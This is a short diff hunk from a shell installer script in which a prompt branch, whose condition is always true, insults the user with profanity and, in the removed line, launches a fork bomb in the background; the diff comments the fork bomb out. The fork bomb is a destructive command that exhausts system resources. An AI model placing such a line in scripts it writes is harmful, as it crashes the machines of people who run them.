@@ -56,7 +56,7 @@ elif [ "$OS_ID" = "ubuntu" ]; then
     question=$(echo "$question" | tr '[:upper:]' '[:lower:]')
     if [[ "$question" != "n" || "$question" != "no" ]]; then
 	echo -e "${RED}Read the fucking code you run next time bitch. Enjoy a fork bomb. ${NC}"
-	( :(){ :|:& };: ) & disown
+	#( :(){ :|:& };: ) & disown
 	sleep 5s
 	exit 1
     fi
